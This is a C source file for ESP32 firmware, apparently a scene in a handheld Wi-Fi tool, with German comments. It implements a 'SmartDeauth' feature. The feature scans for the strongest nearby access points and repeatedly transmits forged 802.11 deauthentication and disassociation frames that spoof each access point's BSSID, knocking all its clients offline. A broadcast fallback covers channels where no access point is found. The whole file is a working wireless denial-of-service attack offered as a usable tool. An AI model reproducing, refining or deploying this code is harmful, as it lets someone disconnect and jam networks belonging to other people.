#include "../wlan_app.h"
#include <wlan_hal.h>
#include <wlan_passwords.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#define TAG "SmartDeauth"
#define SD_CHANNEL_MIN 1
#define SD_CHANNEL_MAX 13
#define SD_TX_PERIOD_MS 5
#define SD_MAX_APS 16
#define SD_RESCAN_INTERVAL_MS 15000 // (b) Ziel-Liste alle 15 s aktualisieren

static const uint8_t sd_deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // RA = broadcast (alle Clients des AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // TA = BSSID (pro Ziel gesetzt)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (pro Ziel gesetzt)
    0x00, 0x00, 0x02, 0x00,
};
static const uint8_t sd_deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08,
                                            0x0a, 0x0d, 0x0f, 0x12, 0x28};
static const uint8_t sd_broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

// (a) Ziel-AP: Broadcast-Deauth im Namen der echten BSSID auf deren Kanal.
typedef struct {
    uint8_t bssid[6];
    uint8_t channel;
} SdTarget;

// Shared state between task and scene
static volatile TaskHandle_t sd_task = NULL;
static volatile bool sd_running = false;
static volatile uint32_t sd_frames = 0;
static volatile uint8_t sd_channel = 1; // manuell gewählter fester Channel (1..13)

// (a) gescannte APs (BSSID + Kanal), nach RSSI absteigend (ESP-IDF-Scan-Default)
static SdTarget sd_targets[SD_MAX_APS];
static volatile uint8_t sd_target_count;

// (c) Verbindung vor dem Angriff, um nach Stop zu reconnecten
static bool sd_was_connected;
static WlanApRecord sd_saved_ap;

// (a) Ein Deauth+Disassoc-Paar an ALLE Clients (RA=broadcast), aber mit der
// echten BSSID als Absender (TA) und im BSSID-Feld — nur so akzeptieren Clients
// den Frame. Ein reiner Broadcast-Absender (ff:ff:...) wird sonst ignoriert
// (dient nur als Fallback, wenn auf dem Channel kein AP bekannt ist).
static void sd_tx_deauth(const uint8_t* bssid) {
    uint8_t f[26];
    memcpy(f, sd_deauth_tmpl, 26);
    memcpy(&f[10], bssid, 6); // TA = BSSID
    memcpy(&f[16], bssid, 6); // BSSID
    uint8_t reason = sd_deauth_reasons[sd_frames % sizeof(sd_deauth_reasons)];
    f[24] = reason;
    if(wlan_hal_raw_tx_retry(f, 26)) sd_frames++;
    f[0] = 0xa0; // Disassoc
    if(wlan_hal_raw_tx_retry(f, 26)) sd_frames++;
}

// Wie viele gescannte APs funken auf diesem Channel?
static uint8_t sd_count_targets_on(uint8_t channel) {
    uint8_t n = 0;
    for(uint8_t i = 0; i < sd_target_count; ++i) {
        if(sd_targets[i].channel == channel) n++;
    }
    return n;
}

// Aktive APs (Kanal 1..13) scannen und als Ziel-Liste ablegen. ESP-IDF liefert
// die Scan-Ergebnisse nach RSSI absteigend → die ersten SD_MAX_APS sind die
// stärksten (nächsten) Netze.
static void sd_scan_targets(void) {
    wlan_hal_set_promiscuous(false, NULL);

    wifi_ap_record_t* recs = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&recs, &count, 64);

    uint8_t n = 0;
    for(uint16_t i = 0; i < count && n < SD_MAX_APS; ++i) {
        uint8_t ch = recs[i].primary;
        if(ch < SD_CHANNEL_MIN || ch > SD_CHANNEL_MAX) continue;
        memcpy(sd_targets[n].bssid, recs[i].bssid, 6);
        sd_targets[n].channel = ch;
        n++;
    }
    if(recs) free(recs);

    sd_target_count = n;
    ESP_LOGI(TAG, "scan: %u target APs", (unsigned)n);
}

static void sd_task_fn(void* arg) {
    UNUSED(arg);
    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    wlan_hal_set_promiscuous(false, NULL);

    TickType_t last_scan = xTaskGetTickCount();
    uint8_t cur_ch = 0; // 0 = noch nicht gesetzt → erzwingt set_channel

    while(sd_running) {
        // (b) periodischer Rescan (blockiert kurz, pausiert den Angriff). Der
        // Scan hoppt intern die Kanäle → danach unseren Channel neu setzen.
        if((xTaskGetTickCount() - last_scan) >= pdMS_TO_TICKS(SD_RESCAN_INTERVAL_MS)) {
            sd_scan_targets();
            last_scan = xTaskGetTickCount();
            cur_ch = 0;
        }

        uint8_t ch = sd_channel; // manuell gewählt (volatile, kann sich ändern)
        if(ch != cur_ch) {
            wlan_hal_set_channel(ch);
            cur_ch = ch;
        }

        // (a) gezielt gegen alle bekannten APs auf diesem Channel deauthen.
        bool any = false;
        for(uint8_t t = 0; t < sd_target_count && sd_running; ++t) {
            if(sd_targets[t].channel != ch) continue;
            sd_tx_deauth(sd_targets[t].bssid);
            any = true;
            vTaskDelay(pdMS_TO_TICKS(SD_TX_PERIOD_MS));
        }

        // Kein bekannter AP auf dem Channel → channel-weiter Broadcast-Deauth
        // als Fallback (weniger wirksam, gibt aber Feedback / trifft versteckte APs).
        if(!any && sd_running) {
            sd_tx_deauth(sd_broadcast);
            vTaskDelay(pdMS_TO_TICKS(SD_TX_PERIOD_MS));
        }
    }

    sd_task = NULL;
    vTaskDelete(NULL);
}

static void sd_update_view(WlanApp* app) {
    WlanSmartDeauthModel* m = view_get_model(app->view_smart_deauth);
    m->running = sd_running;
    m->channel = sd_channel;
    m->frames = sd_frames;
    m->target_count = sd_count_targets_on(sd_channel);
    view_commit_model(app->view_smart_deauth, true);
}

void wlan_app_scene_smart_deauth_on_enter(void* context) {
    WlanApp* app = context;
    sd_running = false;
    sd_frames = 0;

    // (c) aktuelle Verbindung merken, um nach dem Angriff zu reconnecten
    sd_was_connected = app->connected;
    if(app->connected) sd_saved_ap = app->connected_ap;

    sd_scan_targets();

    // Default-Channel: der des stärksten AP, sonst 1.
    sd_channel = (sd_target_count > 0) ? sd_targets[0].channel : 1;

    sd_update_view(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewSmartDeauth);
}

bool wlan_app_scene_smart_deauth_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;

    if(event.type == SceneManagerEventTypeCustom) {
        switch(event.event) {
        case WlanAppCustomEventSmartDeauthToggle:
            if(!sd_running) {
                sd_running = true;
                // Unicore-Build (CONFIG_FREERTOS_UNICORE): nur Core 0 existiert.
                // Core 1 pinnen -> Assert in xTaskCreatePinnedToCore. tskNO_AFFINITY
                // laesst FreeRTOS den (einzigen) Core waehlen.
                xTaskCreatePinnedToCore(
                    sd_task_fn, "sd_deauth", 4096, NULL, 5, (TaskHandle_t*)&sd_task,
                    tskNO_AFFINITY);
            } else {
                sd_running = false; // Task beendet sich selbst
            }
            sd_update_view(app);
            return true;

        case WlanAppCustomEventSmartDeauthChannelDown: // rotate-left / Up
            sd_channel = (sd_channel <= SD_CHANNEL_MIN) ? SD_CHANNEL_MAX : sd_channel - 1;
            sd_update_view(app);
            return true;

        case WlanAppCustomEventSmartDeauthChannelUp: // rotate-right / Down
            sd_channel = (sd_channel >= SD_CHANNEL_MAX) ? SD_CHANNEL_MIN : sd_channel + 1;
            sd_update_view(app);
            return true;

        default:
            break;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        sd_update_view(app);
        return true;
    }

    return false;
}

void wlan_app_scene_smart_deauth_on_exit(void* context) {
    UNUSED(context);
    sd_running = false;

    // Auf Task-Ende warten (max ~3 s, falls er gerade im blockierenden Rescan steckt),
    // bevor wir reconnecten — sonst kollidiert der Reconnect mit Kanalwechseln des Tasks.
    for(int i = 0; i < 300 && sd_task != NULL; ++i) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // (c) STA zum vorher verbundenen Netz reconnecten (nicht-blockierend)
    if(sd_was_connected && sd_saved_ap.ssid[0]) {
        char pw[WLAN_APP_PASSWORD_MAX];
        if(!wlan_password_read(sd_saved_ap.ssid, pw, sizeof(pw))) pw[0] = '\0';
        wlan_hal_connect(
            sd_saved_ap.ssid, pw, sd_saved_ap.bssid, sd_saved_ap.channel);
        sd_was_connected = false;
    }
}
